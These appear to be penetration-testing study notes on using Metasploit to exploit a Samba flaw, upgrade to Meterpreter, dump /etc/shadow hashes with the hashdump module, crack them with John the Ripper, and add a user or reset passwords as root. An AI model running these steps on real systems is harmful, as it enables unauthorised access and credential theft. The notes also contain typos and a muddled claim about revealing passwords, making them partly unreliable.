### Hashdump post-explitation module
* Dump hashes of Linux users
* Where are Linux password hashes are stored:
  * /etc/shadow file
  * It can only be accessed by the root user or a user with root privileges
 
* Hshdump module can be used to dump hashes from /etc/shadow file and also
* to unshadow the hashes with "John the Ripper"

* PRACTICAL
* Repeat steps till db_nmap
* `use exploit/linux/samba/is_knon_pipename`
* `run` --> Command shell
* `sessions -u [ID]` --> Meterpreter session
* ***
* `use post/linux/gather/hashdump`
* `set session [ID]`
* `run` --> this will unshadow the files which can be accessed:
* `loot`
* `cat [file path listed above]` --> List of users and passwords
* But this will not reveal the passwords, so we have to do a bit more processing.
* **Add a new user**
  * `useradd -m [newName] -s /bin/bash`
  * If we have root privilegese, we can change the password of any user:
  * `passwd [username]`
  * And then enter the new password in the next prompt.
 
* Now again when we run gather/hashdump module, we should see the unshadowed passwords.
